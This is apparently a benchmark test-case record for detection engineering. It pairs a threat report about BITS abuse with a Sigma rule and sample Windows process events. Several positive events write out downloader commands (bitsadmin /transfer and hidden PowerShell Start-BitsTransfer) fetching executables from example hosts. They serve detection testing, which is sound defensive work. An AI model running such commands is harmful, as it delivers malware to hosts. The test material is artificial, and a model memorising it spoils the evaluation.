id: CTL1-06
role: control
defect_class: NONE
evasive: false
why: 'Correct rule: tags match T1197 and T1105, all values (bitsadmin.exe, /transfer, /download, powershell.exe,
  Start-BitsTransfer) are quoted in the evidence, each of the two alternatives has its own discriminating
  command-line term, and BITS job listing or the Get-BitsTransfer cmdlet do not match.'
expected_gate: none
report_text: BITS was used as a quiet downloader on infected hosts. A scheduled script ran bitsadmin.exe
  /transfer updatejob /download /priority high http://203.0.113.60/p.exe C:\Users\Public\p.exe, and in
  a second wave the operator switched to powershell.exe and called Start-BitsTransfer with a Source argument
  pointing at the same server. Both forms create a BITS job that survives a reboot until the transfer
  completes. The bitsadmin.exe /transfer switch together with /download is the telltale combination on
  the command line, and the cmdlet name Start-BitsTransfer is the equivalent marker for the PowerShell
  form.
evidence:
- bitsadmin.exe /transfer updatejob /download /priority high http://203.0.113.60/p.exe C:\Users\Public\p.exe
- the operator switched to powershell.exe and called Start-BitsTransfer with a Source argument pointing
  at the same server
logsource: windows_process_creation
techniques:
- T1197
- T1105
sigma_yaml: |
  title: BITS Job Download via Bitsadmin or Start-BitsTransfer
  id: b051cf63-8297-4eb0-9446-71c392e46f06
  status: experimental
  description: 'Detects bitsadmin.exe creating a download transfer, or powershell.exe calling Start-BitsTransfer, to fetch a remote file.'
  references:
    - 'urn:atidep:case'
  author: case-author
  date: 2026/10/02
  tags:
    - attack.execution
    - attack.persistence
    - attack.stealth
    - attack.command_and_control
    - attack.t1197
    - attack.t1105
  logsource:
    category: process_creation
    product: windows
  detection:
    selection_bitsadmin:
      Image|endswith: '\bitsadmin.exe'
      CommandLine|contains|all:
        - '/transfer'
        - '/download'
    selection_powershell:
      Image|endswith: '\powershell.exe'
      CommandLine|contains: 'Start-BitsTransfer'
    condition: 1 of selection*
  falsepositives:
    - 'Software deployment scripts that use BITS to fetch installers'
  level: medium
assumptions: []
events:
  positive:
  - kind: process_create
    image: C:\Windows\System32\bitsadmin.exe
    cmd: bitsadmin.exe /transfer updatejob /download /priority high http://203.0.113.60/p.exe C:\Users\Public\p.exe
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe /c
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\bitsadmin.exe
    cmd: bitsadmin /transfer j1 /download http://files.cranemail.test/a.dll C:\Windows\Temp\a.dll
    parent: C:\Windows\System32\wscript.exe
    parent_cmd: wscript.exe //B C:\Users\alice\AppData\Local\Temp\inv.js
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    cmd: powershell.exe -nop -w hidden -c Start-BitsTransfer -Source http://203.0.113.60/p.exe -Destination
      C:\Users\Public\p.exe
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe /c
    user: LAB\bob
    dest_ip: null
    dest_port: null
    name: null
  negative:
  - kind: process_create
    image: C:\Program Files\Google\Chrome\Application\chrome.exe
    cmd: '"C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory=Default'
    parent: C:\Windows\explorer.exe
    parent_cmd: explorer.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\schtasks.exe
    cmd: schtasks /query /fo LIST
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    cmd: powershell.exe -Command "Get-Service | Where-Object Status -eq Running"
    parent: C:\Windows\explorer.exe
    parent_cmd: explorer.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  lookalike:
  - kind: process_create
    image: C:\Windows\System32\bitsadmin.exe
    cmd: bitsadmin.exe /list /allusers
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    cmd: powershell.exe -Command Get-BitsTransfer
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
tamper_sigma_yaml: ''
